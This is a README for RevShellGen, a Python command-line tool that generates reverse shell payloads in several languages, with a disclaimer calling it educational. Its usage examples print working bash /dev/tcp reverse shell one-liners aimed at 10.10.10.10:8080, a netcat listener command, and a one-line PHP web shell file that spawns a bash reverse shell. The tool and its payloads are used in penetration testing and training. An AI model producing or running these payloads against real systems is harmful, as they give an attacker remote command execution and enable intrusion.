# RevShellGen
RevShellGen is a command line reverse shell generator. It can easily generate predefined reverse shells.

Right now tested only for python3 and under linux environment.

**Disclaimer: This repository, information and scripts in it are for educational purposes only. 
Users take full responsibility for any actions performed using this tool. 
The author accepts no liability for damage caused by this tool.**

## TODO
- add other reverse shell payloads

## Usage
Install required packages from `requirements.txt`.
```
pip3 install -r requirements.txt
```

Run with python3
```
$ python3 rsg.py 
 ______               _______ __           __ __ _______              
|   __ \.-----.--.--.|     __|  |--.-----.|  |  |     __|.-----.-----.
|      <|  -__|  |  ||__     |     |  -__||  |  |    |  ||  -__|     |
|___|__||_____|\___/ |_______|__|__|_____||__|__|_______||_____|__|__|
                                                                      

Available payloads: ['bash', 'java', 'netcat', 'perl', 'php', 'php_reverse_shell_file', 'python', 'ruby', 'tiny_php_shell_file']

usage: rsg.py [-h] [--ip IP] [--interface INTERFACE] [--port PORT] [--payload PAYLOAD] [-s]

optional arguments:
  -h, --help            show this help message and exit
  --ip IP               Local IP address
  --interface INTERFACE
                        Interface
  --port PORT           Opened port
  --payload PAYLOAD     Define which payload to generate
  -s, --silent          Print out only payload
```

Define interface OR ip address, and payload to generate specific payload/s
```
$ python3 rsg.py --ip 10.10.10.10 --payload bash
 ______               _______ __           __ __ _______              
|   __ \.-----.--.--.|     __|  |--.-----.|  |  |     __|.-----.-----.
|      <|  -__|  |  ||__     |     |  -__||  |  |    |  ||  -__|     |
|___|__||_____|\___/ |_______|__|__|_____||__|__|_______||_____|__|__|
                                                                      

Available payloads: ['bash', 'java', 'netcat', 'perl', 'php', 'php_reverse_shell_file', 'python', 'ruby', 'tiny_php_shell_file']

Payload:
bash -i >& /dev/tcp/10.10.10.10/8080 0>&1

Payload:
0<&196;exec 196<>/dev/tcp/10.10.10.10/8080; sh <&196 >&196 2>&196

Payload:
/bin/bash -l > /dev/tcp/10.10.10.10/8080 0<&1 2>&1



For local listener execute:
nc -nvlp 8080
```

When you want to generate file payload (for example `tiny_php_shell_file`), you can use `--silent`
```
$ python3 rsg.py --ip 10.10.10.10 --payload tiny_php_shell_file -s > tiny_shell.php
$ cat tiny_shell.php 
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/8080 0>&1'");?>
```

## References
[1] http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

[2] https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

[3] https://gist.github.com/rshipp/eee36684db07d234c1cc#file-shell-php
